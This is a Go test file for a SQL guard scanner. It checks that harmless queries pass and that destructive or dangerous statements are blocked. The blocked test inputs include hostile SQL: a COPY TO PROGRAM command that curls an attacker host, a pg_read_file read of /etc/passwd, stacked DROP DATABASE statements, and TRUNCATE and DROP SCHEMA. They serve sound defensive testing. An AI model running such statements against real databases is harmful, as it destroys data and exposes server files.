package guard

import (
	"strings"
	"testing"
)

func newScanner(t *testing.T) *Scanner {
	t.Helper()
	s, warnings := New(nil)
	if len(warnings) != 0 {
		t.Fatalf("unexpected warnings from default rules: %v", warnings)
	}
	return s
}

func TestInspectAllows(t *testing.T) {
	s := newScanner(t)

	cases := []struct {
		name string
		sql  string
	}{
		{"simple select", `SELECT 1`},
		{"select with limit", `SELECT id, email FROM users ORDER BY id LIMIT 10`},
		{"trailing semicolon is conventional", `SELECT 1;`},
		{"aggregate", `SELECT count(*) FROM orders WHERE created_at > now() - interval '7 days'`},

		// Literals must not trigger keyword rules: the words appear in data,
		// not in the statement's structure.
		{"keyword inside a string literal", `SELECT 'drop database production' AS note`},
		{"keyword inside a quoted identifier", `SELECT "vacuum" FROM t`},
		{"keyword as part of an identifier", `SELECT vacuum_log, truncate_count FROM audit`},
		{"keyword in a line comment", "-- remember to DROP DATABASE later\nSELECT 1"},
		{"keyword in a block comment", `/* DROP DATABASE old */ SELECT 1`},

		// $1 is a bind placeholder, not a dollar-quote opener.
		{"bind placeholder", `SELECT * FROM users WHERE id = $1`},
		{"two bind placeholders", `SELECT * FROM t WHERE a = $1 AND b = $2`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if d := s.Inspect(tc.sql); !d.Allowed {
				t.Fatalf("expected allowed, got blocked by %s: %s\nnormalised: %q",
					d.RuleID, d.Reason, Normalize(tc.sql))
			}
		})
	}
}

func TestInspectBlocks(t *testing.T) {
	s := newScanner(t)

	cases := []struct {
		name     string
		sql      string
		wantRule string
	}{
		{"drop database", `DROP DATABASE production`, "drop_database"},
		{"drop database lowercase", `drop database production`, "drop_database"},
		{"drop database extra whitespace", "DROP   \n\t DATABASE production", "drop_database"},
		{"vacuum", `VACUUM ANALYZE users`, "vacuum"},
		{"vacuum full", `vacuum full`, "vacuum"},

		// Comments are replaced by whitespace, exactly as the server's lexer
		// treats them, so this is the same statement as DROP DATABASE x.
		{"comment between keywords", `DROP/**/DATABASE production`, "drop_database"},
		{"nested block comment", `/* outer /* inner */ */ DROP DATABASE x`, "drop_database"},

		{"truncate", `TRUNCATE TABLE users`, "truncate"},
		{"drop schema", `DROP SCHEMA public CASCADE`, "drop_schema"},
		{"drop role", `DROP ROLE analyst`, "drop_principal"},
		{"alter system", `ALTER SYSTEM SET work_mem = '1GB'`, "alter_system"},
		{"reindex", `REINDEX TABLE users`, "maintenance"},

		{"copy to program", `COPY t TO PROGRAM 'curl http://attacker.example'`, "copy_program"},
		{"read server file", `SELECT pg_read_file('/etc/passwd')`, "server_file_access"},
		{"terminate backend", `SELECT pg_terminate_backend(42)`, "backend_control"},
		{"anonymous block", `DO $$ BEGIN PERFORM 1; END $$`, "anonymous_block"},

		{"stacked statements", `SELECT 1; DROP DATABASE production`, "stacked_statements"},
		{"stacked benign statements", `SELECT 1; SELECT 2`, "stacked_statements"},

		{"empty", ``, "empty_statement"},
		{"only a comment", `-- nothing to see here`, "empty_statement"},
		{"only whitespace", "   \n\t  ", "empty_statement"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := s.Inspect(tc.sql)
			if d.Allowed {
				t.Fatalf("expected blocked, got allowed\nnormalised: %q", Normalize(tc.sql))
			}
			if d.RuleID != tc.wantRule {
				t.Fatalf("blocked by %q, want %q\nnormalised: %q", d.RuleID, tc.wantRule, Normalize(tc.sql))
			}
		})
	}
}

// A statement that hides a destructive tail inside a string literal must be
// allowed (the literal is data), but one that genuinely stacks statements
// must not be.
func TestStackedStatementDetectionIgnoresSemicolonsInLiterals(t *testing.T) {
	s := newScanner(t)

	if d := s.Inspect(`SELECT 'a;b' AS v`); !d.Allowed {
		t.Fatalf("semicolon inside a literal must not count as a statement separator, got %s", d.RuleID)
	}
	if d := s.Inspect(`SELECT 'a;b' AS v; DROP DATABASE x`); d.Allowed {
		t.Fatal("a real second statement must be detected")
	}
}

func TestNormalize(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"uppercases and collapses space", "select   1", "SELECT 1"},
		{"line comment removed", "SELECT 1 -- trailing\n+ 2", "SELECT 1 + 2"},
		{"block comment removed", "SELECT /* mid */ 1", "SELECT 1"},
		{"nested block comment removed", "SELECT /* a /* b */ c */ 1", "SELECT 1"},
		{"string literal blanked", "SELECT 'secret value'", "SELECT ''"},
		{"doubled quote inside literal", "SELECT 'it''s here'", "SELECT ''"},
		{"escape string literal", `SELECT E'line\'s end'`, "SELECT E ''"},
		{"quoted identifier blanked", `SELECT "my col" FROM t`, `SELECT "" FROM T`},
		{"dollar quoted body blanked", "SELECT $$ anything ; here $$", "SELECT $$"},
		{"tagged dollar quote blanked", "SELECT $tag$ body $tag$", "SELECT $$"},
		{"bind placeholder preserved", "SELECT $1", "SELECT $1"},
		{"unterminated literal does not hang", "SELECT 'abc", "SELECT ''"},
		{"unterminated block comment does not hang", "SELECT /* abc", "SELECT"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := Normalize(tc.in); got != tc.want {
				t.Fatalf("Normalize(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

func TestExtraPatterns(t *testing.T) {
	s, warnings := New([]string{`\bINFORMATION_SCHEMA\b`})
	if len(warnings) != 0 {
		t.Fatalf("unexpected warnings: %v", warnings)
	}
	if d := s.Inspect(`SELECT * FROM information_schema.tables`); d.Allowed {
		t.Fatal("expected operator pattern to block the statement")
	}
}

// A bad operator-supplied pattern must be reported and skipped, never fatal:
// a typo in a systemd unit must not stop the service from booting.
func TestExtraPatternInvalidRegexDoesNotBreakScanner(t *testing.T) {
	s, warnings := New([]string{`([unclosed`})
	if len(warnings) != 1 {
		t.Fatalf("expected exactly one warning, got %v", warnings)
	}
	if d := s.Inspect(`SELECT 1`); !d.Allowed {
		t.Fatalf("scanner must still work after a bad pattern, got %s", d.RuleID)
	}
	if d := s.Inspect(`DROP DATABASE x`); d.Allowed {
		t.Fatal("default rules must survive a bad operator pattern")
	}
}

func TestBlockMessageNamesTheRule(t *testing.T) {
	s := newScanner(t)
	d := s.Inspect(`DROP DATABASE production`)
	msg := BlockMessage(d)

	for _, want := range []string{"BLOCKED", "drop_database", "NOT sent to the database"} {
		if !strings.Contains(msg, want) {
			t.Fatalf("block message missing %q:\n%s", want, msg)
		}
	}
}
